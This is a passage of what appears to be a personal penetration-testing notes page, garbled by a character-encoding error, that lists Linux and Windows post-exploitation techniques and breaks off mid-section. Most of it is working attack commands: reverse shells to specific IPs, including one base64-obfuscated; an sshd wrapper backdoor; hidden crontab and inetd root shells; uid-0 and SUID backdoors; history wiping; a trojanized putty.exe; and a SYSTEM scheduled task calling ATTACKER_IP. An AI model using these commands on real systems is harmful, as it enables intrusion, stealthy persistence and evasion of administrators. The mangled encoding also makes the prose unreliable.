å‚è€ƒç¯å¢ƒå˜é‡æ³¨å…¥ | Khaz's Blog (fgtbnc.github.io) æƒé™é…ç½®ä¸å½“ææƒ åŸç†ï¼šæŸä¸ªè„šæœ¬æˆ–å‘½ä»¤ä»¥ROOTæƒé™è¿è¡Œï¼Œä½†æ˜¯ä½æƒé™ç”¨æˆ·æ‹¥æœ‰ä¿®æ”¹å†™å…¥æƒé™ é€šè¿‡pspyæ‰¾åˆ°å¯ç–‘è¿›ç¨‹ å®šæ—¶ä»»åŠ¡ ..... å·¥å…·ï¼šhttps://github.com/mi1k7ea/M7-05 CVE-2021-4034 pkexec suidææƒ å…¶ä»– teehee teeheeæ˜¯ä¸ªå°ä¼—çš„linuxç¼–è¾‘å™¨ã€‚å¦‚æœæœ‰sudoæƒé™ã€‚å¯ä»¥åˆ©ç”¨å…¶æ¥ææƒ æ ¸å¿ƒæ€è·¯å°±æ˜¯åˆ©ç”¨å…¶åœ¨passwdæ–‡ä»¶ä¸­è¿½åŠ ä¸€æ¡uidä¸º0çš„ç”¨æˆ·æ¡ç›® echo \"raaj::0:0:::/bin/bash\" | sudo teehee -a /etc/passwd æŒ‰ç…§linuxç”¨æˆ·æœºåˆ¶ï¼Œå¦‚æœæ²¡æœ‰shadowæ¡ç›®ï¼Œä¸”passwdç”¨æˆ·å¯†ç æ¡ç›®ä¸ºç©ºçš„æ—¶å€™ï¼Œå¯ä»¥æœ¬åœ°ç›´æ¥suç©ºå¯†ç ç™»å½•ï¼ˆç©ºå¯†ç ä¸èƒ½è¿œç¨‹ç™»å½•ï¼‰ã€‚æ‰€ä»¥åªéœ€è¦æ‰§è¡Œsu raajå°±å¯ä»¥ç™»å½•åˆ°raajç”¨æˆ·ï¼Œè¿™ä¸ªç”¨æˆ·å› ä¸ºuidä¸º0ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯rootæƒé™ Linuxä¿¡æ¯æ”¶é›† ç›¸å…³å‘½ä»¤ ifconfig /sbin/iconfig ip addr show æ•´åˆå·¥å…· ./gather -a é»˜è®¤åœ¨/tmp/reportä¸‹ç”Ÿæˆç»“æœ keyword.txt # è¿™ä¸ªæœ‰ç‚¹å°‘ï¼Œè¦è‡ªå·±åŠ  result.txt tree.txt # ç›®å½•ç»“æ„ è‡ªå·±æ·»åŠ å‘½ä»¤æ•´ç†æˆshè„šæœ¬ Linuxæ¨ªå‘ç§»åŠ¨ å¯†ç ç ´è§£ åˆ¤æ–­/etc/shadowæˆ–/etc/passwdä¸­å­˜å‚¨çš„å¯†ç ä½¿ç”¨çš„åŠ å¯†ç®—æ³• MD5: ä»¥ \"$1$\" å¼€å¤´ã€‚ SHA-256: ä»¥ \"$5$\" å¼€å¤´ã€‚ SHA-512: ä»¥ \"$6$\" å¼€å¤´ã€‚ Blowfish: ä»¥ \"$2a$\"ã€\"$2b$\" æˆ–è€… \"$2y$\" å¼€å¤´ã€‚ DES: ä»¥ \"$\" å¼€å¤´ï¼Œè·Ÿç€ä¸€ä¸ªæ•°å­—ã€‚ Extended DES: ä»¥ \"$9$\" å¼€å¤´ã€‚ Sun MD5: ä»¥ \"$md5$\" å¼€å¤´ã€‚ SHA-1: ä»¥ \"$sha1$\" å¼€å¤´ã€‚ NTLM: ä»¥ \"$NT$\" æˆ– \"$NTLM$\" å¼€å¤´ã€‚ æš´åŠ›ç ´è§£ hashcat.exe -m 1600 -a 0 \"E:\\5.0\\pass.txt\" \"E:\\5.0\\rockyou.txt\" # -a 0 å­—å…¸æ”»å‡» # -m æŒ‡å®šå¯†æ–‡ç±»å‹ # pass.txtä¸­åªèƒ½æ”¾å¯†ç å¯†æ–‡ï¼Œ/etc/passwdæ‹¿åˆ°çš„è¦å»æ‰user: hash idå¯¹ç…§è¡¨ï¼šhttps://hashcat.net/wiki/doku.php?id=example_hashes æ–‡ç« ï¼šhttps://xz.aliyun.com/t/4008?time__1311=n4%2BxnD0DyGYQqY5i%3DDCDlhjeK0KPahGRTRrD Linuxæƒé™ç»´æŒ åå¼¹shell å¸¸ç”¨å‘½ä»¤ æ”»å‡»æœºç›‘å¬ç«¯å£ nc -lnvp port è¢«æ”»å‡»æœº bash -c 'bash -i >& /dev/tcp/ip/port 0>&1' bash -c \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjE5Mi4xMjAvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}\" python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.174.129',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])\" nc 124.220.192.120 1234 -e /bin/bash æ³¨æ„ç‚¹ï¼šç”¨ncè¿›è¡Œåå¼¹shellï¼Œéœ€è¦ncæ˜¯æä¾›-eå‚æ•°çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯ç³»ç»Ÿapté»˜è®¤å®‰è£…çš„éƒ½æ˜¯ä¸æä¾›åå‘é“¾æ¥çš„ç‰ˆæœ¬ã€‚ è§£å†³æ–¹æ³•ï¼š ä¸Šä¼ ç¼–è¯‘å¥½çš„nc åˆ©ç”¨ç®¡é“ç¬¦ è¢«æ”»å‡»æœº æ”»å‡»æœº åˆ©ç”¨1234ç«¯å£å°†ä¼ å…¥å†…å®¹äº¤ç»™bashæ‰§è¡Œï¼Œå†å°†å†…å®¹ä»ç«¯å£8888é€å‡ºå» è·å¾—äº¤äº’å¼shell python3 -c 'import pty;pty.spawn(\"/bin/bash\")' python -c 'import pty;pty.spawn(\"/bin/bash\")' é”®å…¥ Ctrl-Zï¼Œå›åˆ° VPS çš„å‘½ä»¤è¡Œä¸­ï¼›ç¬¬äºŒæ­¥ï¼Œåœ¨ VPS ä¸­æ‰§è¡Œï¼š stty raw -echo fg å›åˆ°å“‘ shell ä¸­ï¼›ç¬¬ä¸‰æ­¥ï¼Œåœ¨å“‘ shell ä¸­é”®å…¥ Ctrl-lï¼Œæ‰§è¡Œï¼š reset export SHELL=bash export TERM=xterm-256color stty rows 54 columns 104 SSHåé—¨ SSH wrapper è¢«æ”»å‡»æœº é¦–å…ˆå¯åŠ¨çš„æ˜¯/usr/sbin/sshd,è„šæœ¬æ‰§è¡Œåˆ°getpeernameè¿™é‡Œçš„æ—¶å€™ï¼Œæ­£åˆ™åŒ¹é…ä¼šå¤±è´¥ï¼Œäºæ˜¯æ‰§è¡Œä¸‹ä¸€å¥ï¼Œå¯åŠ¨/usr/bin/sshdï¼Œè¿™æ˜¯åŸå§‹sshdã€‚åŸå§‹çš„sshdç›‘å¬ç«¯å£å»ºç«‹äº†tcpè¿æ¥åï¼Œä¼šforkä¸€ä¸ªå­è¿›ç¨‹å¤„ç†å…·ä½“å·¥ä½œã€‚è¿™ä¸ªå­è¿›ç¨‹ï¼Œæ²¡æœ‰ä»€ä¹ˆæ£€éªŒï¼Œè€Œæ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿé»˜è®¤çš„ä½ç½®çš„/usr/sbin/sshdï¼Œè¿™æ ·å­æ§åˆ¶æƒåˆå›åˆ°è„šæœ¬äº†ã€‚æ­¤æ—¶å­è¿›ç¨‹æ ‡å‡†è¾“å…¥è¾“å‡ºå·²è¢«é‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œgetpeernameèƒ½çœŸçš„è·å–åˆ°å®¢æˆ·ç«¯çš„TCPæºç«¯å£ï¼Œå¦‚æœæ˜¯19526å°±æ‰§è¡Œshç»™ä¸ªshell ç®€å•ç‚¹å°±æ˜¯ä»sshd forkå‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œå¹¶å¯¹è¿è¿‡æ¥çš„å®¢æˆ·ç«¯ç«¯å£è¿›è¡Œäº†åˆ¤æ–­ã€‚ cd /usr/sbin/ mv sshd ../bin # ä¼šå¯¼è‡´sshä¸èƒ½ç”¨ echo '#!/usr/bin/perl' >sshd echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' >>sshd echo 'exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' >>sshd chmod u+x sshd service sshd restart \\x00\\x004Aæ˜¯13377çš„å¤§ç«¯å½¢å¼ æ”»å‡»æœº socat STDIO TCP4:IP:22,sourceport=port ä¿®æ”¹é€šä¿¡ç«¯å£ # python2 import struct port = 19526 buffer = struct.pack('>I6',port) print repr(buffer) >>'\\x00\\x00LF' echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' >>sshd å˜ä¸º echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..LF/);' >>sshd SSH è½¯è¿æ¥åé—¨ PAMè®¤è¯æœºåˆ¶ï¼Œè‹¥sshdæœåŠ¡ä¸­å¼€å¯äº†PAMè®¤è¯æœºåˆ¶ï¼ˆé»˜è®¤å¼€å¯cat /etc/ssh/sshd_config|grep UsePAMï¼‰ï¼Œå½“ç¨‹åºæ‰§è¡Œæ—¶ï¼ŒPAMæ¨¡å—åˆ™ä¼šæœå¯»PAMç›¸å…³è®¾å®šæ–‡ä»¶ï¼Œè®¾å®šæ–‡ä»¶ä¸€èˆ¬æ˜¯åœ¨/etc/pam.d/ã€‚è‹¥å…³é—­åˆ™ä¼šéªŒè¯å¯†ç ï¼Œæ— æ³•å»ºç«‹è½¯é“¾æ¥åé—¨ã€‚ pam_rootok.soä¸»è¦ä½œç”¨æ˜¯ä½¿å¾—uidä¸º0çš„ç”¨æˆ·ï¼Œå³rootç”¨æˆ·å¯ä»¥ç›´æ¥é€šè¿‡è®¤è¯è€Œä¸éœ€è¦è¾“å…¥å¯†ç ã€‚ find /etc/pam.d |xargs grep \"pam_rootok\" è¿™äº›éƒ½å¯ä»¥ä½œä¸ºsshè½¯é“¾æ¥åé—¨ï¼šå½“æˆ‘ä»¬é€šè¿‡ç‰¹å®šçš„ç«¯å£è¿æ¥sshåï¼Œåº”ç”¨åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­å°±ä¼šå»æ‰¾åˆ°é…ç½®æ–‡ä»¶ï¼Œå¦‚ï¼šæˆ‘ä»¬çš„è½¯é“¾æ¥æ–‡ä»¶ä¸º/tmp/suï¼Œé‚£ä¹ˆåº”ç”¨å°±ä¼šæ‰¾/etc/pam.d/suä½œä¸ºé…ç½®æ–‡ä»¶ï¼Œå› ä¸º/etc/pam.d/suä½¿ç”¨äº†pam_rootok.soæ‰€ä»¥æ— éœ€éªŒè¯å¯†ç å³å¯è¿æ¥ã€‚ å¤±è´¥äº†ã€‚ã€‚ æ˜¯å› ä¸ºSSH wrapper echo '#!/usr/bin/perl' >sshd éœ€è¦é‡æ–°å®‰è£…ssh ln -sf /usr/sbin/su /tmp/su /tmp/su -oPort=8888 å®é™…ä¸Šæ˜¯éšä¾¿è¾“ä¸€ä¸ªå¯†ç å°±å¯ä»¥ç™»é™†ï¼Œä½†æ˜¯ä¸èƒ½ä¸è¾“å¯†ç ã€‚ SSH å…¬é’¥å…å¯†ç™»é™† ä¹‹å‰æ‰“é¶æœºçš„æ—¶å€™çš„ç¬”è®° sshéªŒè¯æ–¹å¼ è¿™é‡Œç¬¬äºŒç§ï¼šå‡è®¾ä¸»æœºAè¦ç”¨SSHç™»å½•åˆ°ä¸»æœºBï¼Œé‚£ä¹ˆåªè¦ä¸»æœºAæœ‰ç§é’¥ï¼Œä¸»æœºBæœ‰å¯¹åº”çš„å…¬é’¥å³å¯ï¼Œä¸æ˜¯ä¸»æœºAç”Ÿäº§çš„ï¼Œè¿˜æ˜¯ä¸»æœºBç”Ÿæˆçš„æ— å…³ã€‚ # hostä¸ºä¸»æœºåï¼ˆrootï¼‰ ssh host@ip -p portï¼ˆpasswordéªŒè¯ï¼‰ ssh host@ip -i id_rsa -p port(å¯†é’¥éªŒè¯ï¼Œç§é’¥æƒé™è¦ä¸º600æ‰å¯ä»¥ä½¿ç”¨) é…ç½®æ–‡ä»¶/etc/ssh/sshd_config PasswordAuthentication yes #å¯ç”¨å¯†ç éªŒè¯ PubkeyAuthentication yes #å¯ç”¨å¯†é’¥å¯¹éªŒè¯ AuthorizedKeysFile .ssh/authorized_keys #æŒ‡å®šå…¬é’¥åº“æ–‡ä»¶ æµç¨‹ ssh-keygen -t rsa # ç”Ÿæˆå¯†é’¥å¯¹ cat id_rsa.pub > authorized_keys #å°†å…¬é’¥å†…å®¹æ”¾åˆ°ç›®æ ‡.ssh/authorized_keysé‡Œ ssh-copy-id host@ip -p 22 #å°†å…¬é’¥ä¸Šä¼ è‡³è¿œç¨‹æœåŠ¡å™¨ç”¨æˆ·ç›®å½•ä¸­ straceåé—¨ é€šè¿‡å‘½ä»¤æ›¿æ¢ï¼ˆå‘½ä»¤è¡Œå¯åŠ¨æ–‡ä»¶åŠ å…¥aliasï¼‰åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚ # ç›‘æ§ssh echo \"alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'\" >> /root/.bashrc # ç«‹å³ç”Ÿæ•ˆ source /root/.bashrc kaliæ²¡æœ‰straceï¼Œä½†æ˜¯äº‘æœåŠ¡å™¨é»˜è®¤æ˜¯è£…äº†çš„ æŸ¥çœ‹è®°å½•çš„sshè¿æ¥ cat /tmp/.ssh.log è‡ªå¯åŠ¨æ–‡ä»¶åé—¨ å†™å…¥è‡ªå¯åŠ¨æ–‡ä»¶ä¸­ å¼€æœºå¯åŠ¨é¡¹ /etc/init.d/ /etc/profile.d/ /etc/rc.d/xxx # åœ¨xxxä¸­æ·»åŠ éœ€è¦å¼€æœºæ‰§è¡Œçš„è„šæœ¬çš„ç»å¯¹è·¯å¾„ bash shellå¯åŠ¨é¡¹ /etc/profile $HOME/.bash_profile $HOME/.bashrc $HOME/.bash_login $HOME/.profile å®šæ—¶ä»»åŠ¡åé—¨ echo xxx > /tmp/1.elf chmod +x /tmp/1.elf (crontab -l;printf \"*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n\") å°†no crontab for whoamiæ–‡ä»¶å†™åˆ°/var/spool/cron/crontabs/rootä¸­ï¼Œè€Œcrontab -lå°±æ˜¯åˆ—å‡ºäº†è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚æ‰€ä»¥å½“ç®¡ç†å‘˜ä½¿ç”¨crontab -læŸ¥çœ‹å®šæ—¶ä»»åŠ¡æ—¶ï¼Œå°±ä¼šçœ‹åˆ°no crontab for rootï¼Œä»è€Œèµ·åˆ°äº†éšè—çš„æ•ˆæœã€‚ æ·»åŠ è¶…çº§ç”¨æˆ· åº”æ€¥å“åº”ç¬¬ä¸€ä¸ªå°±æ’æŸ¥/etc/passwd useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test Suidåé—¨ SUIDæƒé™ä»…å¯¹äºŒè¿›åˆ¶ç¨‹åºæœ‰æ•ˆ cp /bin/bash /tmp/.long #å°†bashå‘½ä»¤cpåˆ°.longäºŒè¿›åˆ¶ç¨‹åºä¸­ chmod u+s /tmp/.long #èµ‹äºˆSUIDæ–‡ä»¶çš„æƒé™ /tmp/.long -p bash2 é’ˆå¯¹suidæœ‰ä¸€äº›é˜²æŠ¤ï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸Š-på‚æ•°æ¥è·å–ä¸€ä¸ªrootçš„shellã€‚ inetdåé—¨ inetdæ˜¯ä¸€ä¸ªç›‘å¬å¤–éƒ¨ç½‘ç»œè¯·æ±‚(å°±æ˜¯ä¸€ä¸ªsocket)çš„ç³»ç»Ÿå®ˆæŠ¤è¿›ç¨‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸º13ç«¯å£ã€‚å½“inetdæ¥æ”¶åˆ°ä¸€ä¸ªå¤–éƒ¨è¯·æ±‚åï¼Œå®ƒä¼šæ ¹æ®è¿™ä¸ªè¯·æ±‚åˆ°è‡ªå·±çš„é…ç½®æ–‡ä»¶ä¸­å»æ‰¾åˆ°å®é™…å¤„ç†å®ƒçš„ç¨‹åºï¼Œç„¶åå†æŠŠæ¥æ”¶åˆ°çš„è¿™ä¸ªsocketäº¤ç»™é‚£ä¸ªç¨‹åºå»å¤„ç†ã€‚ # å®‰è£… apt-get install openbsd-inetd # å†™å…¥é…ç½®æ–‡ä»¶ echo 'daytime stream tcp nowait root /bin/bash bash -i' >> /etc/inetd.conf # è¯·æ±‚daytimeæœåŠ¡å¯¹åº”çš„13ç«¯å£ nc -vv 192.168.111.128 13 é…ç½®è§£é‡Š daytime stream tcp nowait root /bin/bash bash -i # å½“å¤–éƒ¨è¯·æ±‚åä¸ºdaytimeçš„æœåŠ¡æ—¶å°±å¼¹shell æ›´æ”¹çš„è¯åªéœ€è¦ä¿®æ”¹service_nameå’Œncè¿æ¥çš„ç«¯å£ï¼ŒæœåŠ¡ä¸ç«¯å£çš„æ˜ å°„å…³ç³»åœ¨/etc/servicesä¸­ ICMPåé—¨ https://github.com/andreafabrizi/prism DNSåé—¨ https://github.com/DamonMohammadbagher/NativePayload_DNS https://github.com/iagox86/dnscat2 http://code.kryo.se/iodine è¿›ç¨‹æ³¨å…¥ https://github.com/gaffe23/linux-inject https://sourceforge.net/projects/cymothoa/files/ https://github.com/screetsec/Vegile éšè—æ–‡ä»¶/ç›®å½•æŠ€å·§ åˆ›å»ºä»¥.å¼€å¤´çš„éšè—æ–‡ä»¶ ç”¨ls -aæ‰èƒ½çœ‹åˆ° å»ºç«‹æ–‡ä»¶åä¸º...çš„æ–‡ä»¶ å‚æ•°æ··æ·† ä¸‹é¢ä¸¤ç§æ–¹æ³•å¯ä»¥ä½¿ç”¨rm -- -rmåˆ é™¤ å»ºç«‹æ–‡ä»¶åä¸º-rmçš„æ–‡ä»¶ å»ºç«‹æ–‡ä»¶åä¸º--çš„æ–‡ä»¶ æ—¢ä¸æŠ¥é”™ï¼Œä¹Ÿæ²¡æœ‰åˆ é™¤ chattréšè—æƒé™ chattr +i æ˜¯ä¸€ä¸ª Linux å‘½ä»¤ï¼Œç”¨äºå°†æ–‡ä»¶æˆ–ç›®å½•è®¾ç½®ä¸ºä¸å¯ä¿®æ”¹ï¼ˆimmutableï¼‰ã€‚å½“åº”ç”¨äº† +i å±æ€§åï¼Œæ–‡ä»¶æˆ–ç›®å½•å°†æ— æ³•è¢«ä¿®æ”¹ã€åˆ é™¤ã€é‡å‘½åæˆ–é“¾æ¥ã€‚è¿™ä¸ªå±æ€§ä¸»è¦ç”¨äºä¿æŠ¤å…³é”®ç³»ç»Ÿæ–‡ä»¶æˆ–ç›®å½•ï¼Œé˜²æ­¢å®ƒä»¬è¢«æ„å¤–æˆ–æ¶æ„ç¯¡æ”¹ã€‚è¯·æ³¨æ„ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦åœ¨å…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·ä¸‹æ‰§è¡Œ chattr +i hack.sh #lsattræ‰å¯ä»¥çœ‹åˆ°è¯¥æƒé™ # åˆ é™¤ chattr -i hack.sh rm -rf hack.sh å·¥å…· éœ€è¦python3ç¯å¢ƒRuoJi6/HackerPermKeeper (github.com) ğŸ”’æƒé™ç»´æŒæ¨¡å— centos Ubuntu æ¨èæŒ‡æ•° éœ€è¦æƒé™ å¤‡æ³¨ py2 py3 OpenSSHåé—¨ä¸‡èƒ½å¯†ç &è®°å½•å¯†ç  âŒ âœ”ï¸ â­ root æ­¤åé—¨éœ€è¦å¾ˆè€çš„å†…æ ¸ç‰ˆæœ¬ï¼Œè€Œä¸”éœ€è¦å¾ˆå¤šä¾èµ–ç¯å¢ƒ âŒ âœ”ï¸ PAMåé—¨ âŒ âŒ â­ âŒ æ­¤åé—¨éœ€è¦å¾ˆè€çš„å†…æ ¸ç‰ˆæœ¬ï¼Œè€Œä¸”éœ€è¦å¾ˆå¤šä¾èµ–ç¯å¢ƒ âŒ âŒ sshè½¯é“¾æ¥ âœ”ï¸ âœ”ï¸ â­ â­ root å®¹æ˜“è¢«å‘ç° âœ”ï¸ âœ”ï¸ sshå…¬ç§å¯†é’¥ âœ”ï¸ âœ”ï¸ â­ â­ â­ â­ â­ User å‘ç°ç¨‹åº¦å¾ˆéš¾ï¼Œå‚è€ƒäº†æŒ–çŸ¿ç—…æ¯’ âœ”ï¸ âœ”ï¸ åé—¨å¸å· âœ”ï¸ âœ”ï¸ â­ â­ â­ root ç”¨å‘½ä»¤æ·»åŠ è´¦æˆ·ï¼Œä¸ä¼šåˆ›å»ºç”¨æˆ·homeç›®å½•[æœ‰ä¸€ä¸ªæ˜¯ç›´æ¥æŒ‡å‘rootç›®å½•] âœ”ï¸ âœ”ï¸ crontabè®¡åˆ’ä»»åŠ¡ âœ”ï¸ âœ”ï¸ â­ â­ â­ â­ User or root éš¾ä»¥å‘ç°ï¼Œé€šè¿‡æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ âœ”ï¸ âœ”ï¸ Straceåé—¨ âœ”ï¸ âœ”ï¸ â­ â­ root é”®ç›˜è®°å½•çš„åé—¨ âœ”ï¸ âœ”ï¸ Aliasåé—¨ âœ”ï¸ âœ”ï¸ â­ â­ â­ â­ root åˆ«ååé—¨ï¼Œéš¾ä»¥å‘ç°ï¼Œä½†æ˜¯éœ€è¦ç”¨æˆ·å»æ‰§è¡Œå‘½ä»¤ âœ”ï¸ âœ”ï¸ Rootkitåé—¨[æ£€æµ‹] âŒ âŒ â­ â­ â­ root éš¾ä»¥å‘ç°ï¼Œä½†æ˜¯å®‰è£…å¤æ‚ï¼Œè€Œä¸”æŒ‡å®šå†…æ ¸ç‰ˆæœ¬ âŒ âŒ ç©ºæ ¼ä¸è®°å½•å‘½ä»¤ âœ”ï¸ âœ”ï¸ â­ â­ â­â­â­â­ root æœ‰çš„æœåŠ¡å™¨è®¾ç½®äº†ç©ºæ ¼è®°å½•æ‰§è¡Œå‘½ä»¤ï¼Œæ‰§è¡Œè¿™ä¸ªè„šæœ¬å¿«é€Ÿè®¾ç½®ä¸è®°å½•ç©ºæ ¼å‘½ä»¤ âœ”ï¸ âœ”ï¸ sshè½¯é“¾æ¥&crontab âœ”ï¸ âœ”ï¸ â­ â­ â­ â­ root å¿«é€Ÿç”Ÿæˆè½¯é“¾æ¥ï¼Œå¹¶ä¸”æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œæ¯åˆ†é’Ÿåˆ¤æ–­å½“å‰è½¯é“¾æ¥æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœè¢«killæ‰ï¼Œå°±é‡æ–°æ‰§è¡Œ âœ”ï¸ âœ”ï¸ check.py âœ”ï¸ âœ”ï¸ â­ â­ â­ â­â­â­ User å¿«é€Ÿæ£€æµ‹ç›®æ ‡æœºå™¨å¯ä»¥ä½¿ç”¨é‚£ä¸ªæƒé™ç»´æŒæ¨¡å— âœ”ï¸ âœ”ï¸ sshkeyå¯†é’¥&crontab âœ”ï¸ âœ”ï¸ â­ â­ â­ â­â­ â­ User or root å¿«é€Ÿç”Ÿæˆsshå¯†é’¥ï¼Œå¹¶ä¸”æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œæ¯åˆ†é’Ÿåˆ¤æ–­å½“å‰å¯†é’¥å’Œå¤šä¸ªæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœè¢«killæ‰ï¼Œå°±é‡æ–°æ‰§è¡Œ âœ”ï¸ âœ”ï¸ phpæƒé™ç»´æŒä¸æ­»å…æ€é©¬ âœ”ï¸ âœ”ï¸ â­ â­ â­ â­â­ â­ User or root phpwebæƒé™ç»´æŒé©¬ âœ”ï¸ âœ”ï¸ Linuxç—•è¿¹æ¸…ç† å†å²å‘½ä»¤ # ç¦ç”¨äº†Shellç¯å¢ƒä¸­çš„å‘½ä»¤å†å²è·Ÿè¸ªå’Œå­˜å‚¨ unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0 å…¥ä¾µç—•è¿¹æ¸…ç† | Khaz's Blog (fgtbnc.github.io) Linuxæ–‡ä»¶ä¼ è¾“ https://www.cnblogs.com/yokan/p/16069234.html SCP scp -P port file root@104.243.25.78:/root/source_code éœ€è¦è¾“å…¥sshå¯†ç ï¼Œæ‰€ä»¥è¦å…ˆè·å¾—äº¤äº’å¼shell å…¶ä»– find / -name \"*.conf\" find / -name \"*python*\" -type f -executable 2>/dev/null ä¸Šä¼ çš„phpæ— æ³•æ‰§è¡Œ åœ¨phpå¼€å¤´æ·»åŠ  #!/bin/phpå¹¶æ‰§è¡Œchmod +x xx.php Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-11-30 20:26:06 "},"02.åæ¸—é€/WindowsåŸŸæ¸—é€/Windowså†…ç½‘æ¸—é€.html":{"url":"02.åæ¸—é€/WindowsåŸŸæ¸—é€/Windowså†…ç½‘æ¸—é€.html","title":"Windowså†…ç½‘æ¸—é€","keywords":"","body":"ä¿¡æ¯æ”¶é›† æœ¬æœºä¿¡æ¯æ”¶é›† # ç”¨æˆ·åˆ—è¡¨ï¼šwindowsç”¨æˆ·åˆ—è¡¨ åˆ†æé‚®ä»¶ç”¨æˆ·ï¼Œå†…ç½‘[åŸŸ]é‚®ä»¶ç”¨æˆ·ï¼Œé€šå¸¸å°±æ˜¯å†…ç½‘[åŸŸ]ç”¨æˆ· net user /domain # è¿›ç¨‹åˆ—è¡¨ï¼šåˆ†ææ€æ¯’è½¯ä»¶/å®‰å…¨ç›‘æ§å·¥å…·ç­‰ é‚®ä»¶å®¢æˆ·ç«¯ VPN ftpç­‰ tasklist /svc # ç«¯å£åˆ—è¡¨ï¼šå¼€æ”¾ç«¯å£å¯¹åº”çš„å¸¸è§æœåŠ¡/åº”ç”¨ç¨‹åº[åŒ¿å/æƒé™/æ¼æ´ç­‰] åˆ©ç”¨ç«¯å£è¿›è¡Œä¿¡æ¯æ”¶é›† netstat -ano # è¡¥ä¸åˆ—è¡¨ï¼šåˆ†æ Windows è¡¥ä¸ ç¬¬ä¸‰æ–¹è½¯ä»¶[Java/Oracle/Flash ç­‰]æ¼æ´ systeminfo # æœ¬æœºå…±äº«ï¼šæœ¬æœºå…±äº«åˆ—è¡¨/è®¿é—®æƒé™ æœ¬æœºè®¿é—®çš„åŸŸå…±äº«/è®¿é—®æƒé™ smbclient -L ip net view \\\\ip # æ•æ„Ÿä¿¡æ¯ï¼šæŸ¥çœ‹å®‰è£…ç¨‹åºå’Œç‰ˆæœ¬ä¿¡æ¯ï¼Œæµè§ˆå™¨ï¼Œé€šè®¯è½¯ä»¶ï¼Œå„ç±»å¯†ç æ”¶é›† wmic product get name,version findstr /sim 'password' *.txt *.xml *.docx *.php # é€’å½’æœç´¢å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ ç½‘ç»œæ‹“æ‰‘æ”¶é›† # ç½‘å¡ ipconfig /all # è·¯ç”± route print # arpç¼“å­˜ arp -a åŸŸä¿¡æ¯æ”¶é›† æƒé™ç»´æŒ æ·»åŠ åé—¨ç”¨æˆ· RIDåŠ«æŒ åé—¨æ–‡ä»¶ ç¯¡æ”¹exe é€šè¿‡msfå‘exeä¸­æ¤å…¥è½½è· msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b \"\\x00\" -f exe -o puttyX.exe å®éªŒå¤±è´¥ ç¯¡æ”¹å¿«æ·æ–¹å¼ å°†å¿«æ·æ–¹å¼çš„å±æ€§å€¼æŒ‡å‘æ¶æ„æ–‡ä»¶ powershell.exe -WindowStyle hidden C:\\Users\\khaz\\Desktop\\calc.ps1 ä½†æ˜¯powershelçª—å£ä¼šä¸€é—ªè€Œè¿‡ åŠ«æŒæ–‡ä»¶å…³è” åˆ›å»ºWindows ä»»åŠ¡è®¡åˆ’ç¨‹åº # åˆ›å»ºä»»åŠ¡è®¡åˆ’ schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr \"c:\\tools\\nc64 -e cmd.exe ATTACKER_IP 4449\" /ru SYSTEM /sc minute /mo 1ï¼šä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ /tn ï¼šä»»åŠ¡è®¡åˆ’åç§° /tr ï¼šæ‰§è¡Œçš„å‘½ä»¤ /ru ï¼šä»¥ä»€ä¹ˆæƒé™è¿è¡Œ # æŸ¥è¯¢ä»»åŠ¡è®¡åˆ’ schtasks /query éšè—ä»»åŠ¡è®¡åˆ’ æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ é™¤å…¶å®‰å…¨æè¿°ç¬¦ï¼ˆSDï¼‰ä½¿ä»»åŠ¡è®¡åˆ’å¯¹ç³»ç»Ÿä¸­çš„ä»»ä½•ç”¨æˆ·ä¸å¯è§ã€‚ æ‰€æœ‰è®¡åˆ’ä»»åŠ¡çš„å®‰å…¨æè¿°ç¬¦éƒ½å­˜å‚¨åœ¨è®¡ç®—æœº\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\ä¸­åä¸ºâ€œSDâ€çš„å€¼ æ·»åŠ è‡ªå¯åŠ¨é¡¹ å¯åŠ¨é¡¹ç›®å½• # ç‰¹å®šç”¨æˆ·ç™»å½•æ—¶ 